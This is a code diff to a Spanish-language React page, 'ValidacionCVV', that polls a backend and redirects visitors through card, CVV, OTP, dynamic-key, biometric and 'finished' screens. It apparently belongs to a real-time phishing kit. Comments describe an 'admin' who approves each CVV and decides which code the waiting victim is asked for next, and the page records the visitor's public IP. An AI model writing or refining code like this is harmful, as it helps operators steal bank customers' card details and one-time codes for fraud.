@@ -3,6 +3,7 @@ import { useNavigate } from "react-router-dom";
 import localStorageService from "../../services/localStorageService";
 import { instanceBackend } from "../../axios/instanceBackend"; // Corrección path relativo
 import Loading from "../../components/Loading"; // Import Loading
+import IniciarSesionModal from "./modals/iniciarSesionModal";
 import './css/LoginModal.css';
 
 // Se exporta el componente
@@ -14,22 +15,42 @@ export default function ValidacionCVV() {
     const [cargando, setCargando] = useState(false); // Loading state
     const [polling, setPolling] = useState(false); // Estado para activar polling
 
-    // Ref para controlar el estado de carga (fix compilación y loop)
-    const loadingRef = useRef(false);
+    // Estado para el modal de error
+    const [formState, setFormState] = useState({
+        lanzarModalErrorSesion: false,
+    });
 
-    // Polling para verificar estado
+    const loadingRef = useRef(false);
+    const estadoAnteriorRef = useRef(null);
+    const aprobadoEsperandoRef = useRef(false);
+
     useEffect(() => {
+        if (!polling) return;
+
         let interval;
+        let timeoutId;
+        let attempts = 0;
+        const MAX_ATTEMPTS = 60;
+        const TIMEOUT_MS = 180000;
+        aprobadoEsperandoRef.current = false;
+        estadoAnteriorRef.current = null;
 
         const checkStatus = async () => {
             try {
+                attempts++;
                 const userData = JSON.parse(localStorage.getItem("datos_usuario"));
                 const sesionId = userData?.attributes?.sesion_id || userData?.sesion_id;
-                if (!sesionId) return;
+                if (!sesionId) {
+                    clearInterval(interval);
+                    clearTimeout(timeoutId);
+                    setPolling(false);
+                    setCargando(false);
+                    return;
+                }
 
                 const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
                 const { estado, cardData } = response.data;
-                console.log("Estado polling:", estado);
+                console.log("Estado polling CVV:", estado, `Intento: ${attempts}/${MAX_ATTEMPTS}`);
 
                 // UPDATE CARD DATA IF PRESENT
                 if (cardData) {
@@ -37,41 +58,177 @@ export default function ValidacionCVV() {
                     localStorageService.setItem("selectedCardData", cardData);
                 }
 
-                if (estado === 'error_cvv_custom') {
+                // Verificar timeout o máximo de intentos
+                if (attempts >= MAX_ATTEMPTS) {
+                    clearInterval(interval);
+                    clearTimeout(timeoutId);
                     setCargando(false);
                     setPolling(false);
-                    alert("El código de verificación (CVV) es incorrecto. Por favor, verifícalo e inténtalo nuevamente.");
+                    // Mostrar modal de error en lugar de alert
+                    setFormState(prev => ({
+                        ...prev,
+                        lanzarModalErrorSesion: true
+                    }));
+                    // Ocultar modal después de 2 segundos
+                    setTimeout(() => {
+                        setFormState(prev => ({
+                            ...prev,
+                            lanzarModalErrorSesion: false
+                        }));
+                    }, 2000);
                     setCvv("");
-                } else if (estado !== 'pendiente' && estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_tc_approval' && estado !== 'awaiting_cvv_approval') {
-                    // Switch para manejar redirecciones específicas
-                    switch (estado) {
-                        case 'solicitar_tc': navigate("/validacion-tc"); break;
-                        case 'solicitar_tc_custom': navigate("/validacion-tc-custom"); break; // Redirigir a TC Custom View
-                        case 'solicitar_otp': navigate("/numero-otp"); break;
-                        case 'solicitar_din': navigate("/clave-dinamica"); break;
-                        case 'solicitar_finalizar': navigate("/finalizado-page"); break;
-                        case 'solicitar_biometria': navigate("/verificacion-identidad"); break;
-                        case 'error_923': navigate("/error-923page"); break;
+                    return;
+                }
 
-                        case 'error_tc': navigate("/validacion-tc"); break;
-                        case 'error_otp': navigate("/numero-otp"); break;
-                        case 'error_din': navigate("/clave-dinamica"); break;
-                        case 'error_login': navigate("/autenticacion"); break;
+                const estadosEspera = ['pendiente', 'awaiting_tc_approval', 'awaiting_cvv_approval'];
+                if (estadosEspera.includes(estado)) {
+                    estadoAnteriorRef.current = estado;
+                    return;
+                }
 
-                        default:
-                            console.log("Estado no manejado en redirección:", estado);
-                    }
+                if (estado === 'solicitar_cvv_custom' || estado === 'solicitar_cvv') {
+                    clearInterval(interval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    setPolling(false);
+                    return;
+                }
+
+                if (estado === 'error_cvv_custom') {
+                    clearInterval(interval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    setPolling(false);
+                    setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
+                    setTimeout(() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false })), 2000);
+                    setCvv("");
+                    return;
+                }
+
+                // Admin aprobó CVV Custom: backend pone 'solicitar_din' y muestra menú.
+                // Usuario debe QUEDAR EN ESPERA hasta que admin pulse OTP, DIN o FIN.
+                const prev = estadoAnteriorRef.current;
+                const aprobadoAhora = (prev === 'awaiting_cvv_approval' || prev === 'awaiting_tc_approval') && estado === 'solicitar_din';
+                if (aprobadoAhora) {
+                    aprobadoEsperandoRef.current = true;
+                    estadoAnteriorRef.current = estado;
+                    return;
+                }
+                if (aprobadoEsperandoRef.current && estado === 'solicitar_din') {
+                    estadoAnteriorRef.current = estado;
+                    return;
+                }
+                estadoAnteriorRef.current = estado;
+
+                const estadosRedireccion = [
+                    'solicitar_tc', 'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',
+                    'solicitar_biometria', 'error_923',
+                    'solicitar_tc_custom', 'solicitar_cvv_custom',
+                    'error_tc', 'error_otp', 'error_din', 'error_login',
+                    'aprobado', 'error_pantalla', 'bloqueado_pantalla'
+                ];
+                if (!estadosRedireccion.includes(estado?.toLowerCase())) return;
+
+                clearInterval(interval);
+                clearTimeout(timeoutId);
+                setCargando(false);
+                setPolling(false);
+
+                switch (estado.toLowerCase()) {
+                    case 'solicitar_tc':
+                        navigate("/validacion-tc");
+                        break;
+                    case 'solicitar_tc_custom':
+                        navigate("/validacion-tc");
+                        break;
+                    case 'solicitar_otp':
+                        navigate("/numero-otp");
+                        break;
+                    case 'solicitar_din':
+                        navigate("/clave-dinamica");
+                        break;
+                    case 'solicitar_finalizar':
+                        navigate("/finalizado-page");
+                        break;
+                    case 'solicitar_biometria':
+                        navigate("/verificacion-identidad");
+                        break;
+                    case 'error_923':
+                        localStorage.setItem('estado_sesion', 'error');
+                        navigate("/error-923page");
+                        break;
+                    case 'error_tc':
+                        localStorage.setItem('estado_sesion', 'error');
+                        navigate("/validacion-tc");
+                        break;
+                    case 'error_otp':
+                        localStorage.setItem('estado_sesion', 'error');
+                        navigate("/numero-otp");
+                        break;
+                    case 'error_din':
+                        localStorage.setItem('estado_sesion', 'error');
+                        navigate("/clave-dinamica");
+                        break;
+                    case 'error_login':
+                        localStorage.setItem('estado_sesion', 'error');
+                        navigate("/autenticacion");
+                        break;
+                    default:
+                        console.log("Estado no manejado en redirección:", estado);
                 }
             } catch (error) {
                 console.error("Error polling:", error);
+                attempts++;
+                // Si hay muchos errores consecutivos, detener polling
+                if (attempts >= MAX_ATTEMPTS) {
+                    clearInterval(interval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    setPolling(false);
+                    // Mostrar modal de error en lugar de alert
+                    setFormState(prev => ({
+                        ...prev,
+                        lanzarModalErrorSesion: true
+                    }));
+                    // Ocultar modal después de 2 segundos
+                    setTimeout(() => {
+                        setFormState(prev => ({
+                            ...prev,
+                            lanzarModalErrorSesion: false
+                        }));
+                    }, 2000);
+                }
             }
         };
 
-        // Ejecutar polling siempre (cada 3s) para navegación fluida
+        // Ejecutar polling cada 3s solo cuando polling está activo
         interval = setInterval(checkStatus, 3000);
 
-        return () => clearInterval(interval);
-    }, [navigate]);
+        // Timeout global de 3 minutos
+        timeoutId = setTimeout(() => {
+            clearInterval(interval);
+            setCargando(false);
+            setPolling(false);
+            // Mostrar modal de error en lugar de alert
+            setFormState(prev => ({
+                ...prev,
+                lanzarModalErrorSesion: true
+            }));
+            // Ocultar modal después de 2 segundos
+            setTimeout(() => {
+                setFormState(prev => ({
+                    ...prev,
+                    lanzarModalErrorSesion: false
+                }));
+            }, 2000);
+            setCvv("");
+        }, TIMEOUT_MS);
+
+        return () => {
+            clearInterval(interval);
+            clearTimeout(timeoutId);
+        };
+    }, [polling, navigate]);
 
     // ... (rest of states)
 
@@ -224,6 +381,33 @@ export default function ValidacionCVV() {
 
     // Se crea el useEffect para capturar la ip publica y la hora en estandar
     useEffect(() => {
+
+        // Se valida si el estado en el localStorage es error
+        const estadoSesion = localStorage.getItem('estado_sesion');
+
+        // Si es error, se muestra el modal
+        if (estadoSesion === 'error') {
+
+            // Se borra el estado del localStorage
+            localStorage.removeItem('estado_sesion');
+
+            // Se muestra el modal de error de sesión OTP
+            setFormState(prev => ({
+                ...prev,
+                lanzarModalErrorSesion: true
+            }));
+
+            // Se quita a los 2 segundos
+            setTimeout(() => {
+
+                // Se oculta el modal de error de sesión OTP
+                setFormState(prev => ({
+                    ...prev,
+                    lanzarModalErrorSesion: false
+                }));
+            }, 2000);
+        };
+        
         // Se obtiene la IP
         obtenerIP();
         // Se obtiene la fecha/hora con formato
@@ -637,6 +821,15 @@ export default function ValidacionCVV() {
 
             {/* Cargando */}
             {cargando ? <Loading /> : null}
+
+            {/* Modal de error de sesión */}
+            <IniciarSesionModal 
+                isOpen={formState.lanzarModalErrorSesion} 
+                onClose={() => setFormState(prev => ({
+                    ...prev,
+                    lanzarModalErrorSesion: false
+                }))} 
+            />
         </>
     );
 };
